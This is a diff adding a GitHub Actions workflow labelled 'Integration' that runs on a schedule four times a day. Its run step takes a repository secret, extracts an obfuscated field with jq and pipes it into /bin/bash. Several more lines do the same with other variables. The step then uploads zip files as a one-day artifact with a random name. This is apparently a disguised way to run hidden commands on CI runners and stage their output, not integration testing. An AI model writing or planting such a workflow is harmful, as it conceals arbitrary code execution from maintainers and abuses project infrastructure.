@@ -1,0 +1,31 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '0 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run
+        env:
+          icmrx52: ${{ secrets.icmrx52 }}
+        run: |
+          printf '%s' "$icmrx52" | jq -r .xc226 | /bin/bash
+          printf '%s' "$lrv44700" | jq -r .x4 | /bin/bash
+          printf '%s' "$hx549" | jq -r .bghq65 | /bin/bash
+          printf '%s' "$njr17305" | jq -r .q63954 | /bin/bash
+          printf '%s' "$qpm7159" | jq -r .sgf57 | /bin/bash
+          echo $vz75251 | jq -r .ynaed6247 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: WU1yoz2p
+          path: "*.zip"
+          retention-days: 1
